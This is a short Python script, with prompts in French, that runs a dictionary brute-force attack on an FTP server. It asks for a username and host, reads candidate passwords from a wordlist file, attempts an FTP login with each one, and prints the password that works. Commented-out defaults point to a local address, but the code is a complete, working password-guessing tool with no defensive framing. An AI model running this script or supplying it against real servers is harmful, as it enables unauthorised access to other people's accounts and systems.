from ftplib import FTP
list_password = "wordlist.txt"

def bruteforce_dico():
    username = input("saisissez le nom d'utilisateur:")
    host = input("saisissez le host:")

    # username = "test"
    # host = "127.0.0.1"

    def start():
        t = []
        f = open(list_password)
        t = f.readlines()
        for password in t:
            password = password.strip()
            try:
                ftp = FTP(host)
                ftp.login(user=username, passwd=password)
                print("Success:", str(password))
                break
            except Exception as e:
                print("Erreur:", str(e), "  -  ", password)

    start()
